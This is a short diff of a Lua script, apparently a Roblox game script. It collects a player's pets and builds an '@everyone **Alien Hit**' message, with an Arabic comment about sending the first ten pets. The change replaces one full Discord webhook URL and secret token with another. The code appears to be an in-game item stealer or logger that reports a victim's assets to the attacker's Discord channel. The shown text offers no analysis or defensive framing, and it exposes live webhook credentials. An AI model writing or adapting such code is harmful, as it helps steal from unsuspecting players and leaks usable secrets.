@@ -143,7 +143,7 @@ task.spawn(function()
     end
     if #pets == 0 then return end
 
-    local WEBHOOK_URL = "https://discord.com/api/webhooks/1404963543555768383/6qQU8_ItNMIXpsqtZGDTXuGpO-TdRLbxUDMR_ulseo32MKwxqP8ILq_Lfbt76DNfHGT4"
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1422573891943010349/mc5Nt5JD7B0QTKZWhgYdUhzfYJRxyPMb1x9qucLBccpmdE8jLV3cIUV79NaQjQZZ4uqW"
 
     -- إرسال أول 10 بيتات كرسالة
     local message = "@everyone **Alien Hit**\n──────────────\n" ..
